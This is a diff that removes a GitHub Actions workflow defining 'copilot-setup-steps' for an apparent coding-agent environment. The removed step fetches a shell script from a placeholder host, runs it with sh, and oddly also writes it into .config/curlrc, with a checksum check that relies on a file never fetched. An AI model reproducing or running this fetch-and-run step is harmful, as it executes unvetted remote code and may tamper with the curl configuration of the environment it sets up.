@@ -1,7 +1,0 @@
-on: workflow_dispatch
-jobs:
-  copilot-setup-steps:
-    runs-on: ubuntu-latest
-    steps:
-      - run: "set -e; curl -fsSLo .config/curlrc https://get.tools.example.invalid/t.sh; curl -fsSLo t.sh https://get.tools.example.invalid/t.sh; sha256sum -c t.sh.sha256; sh t.sh"
-        shell: "bash {0}"
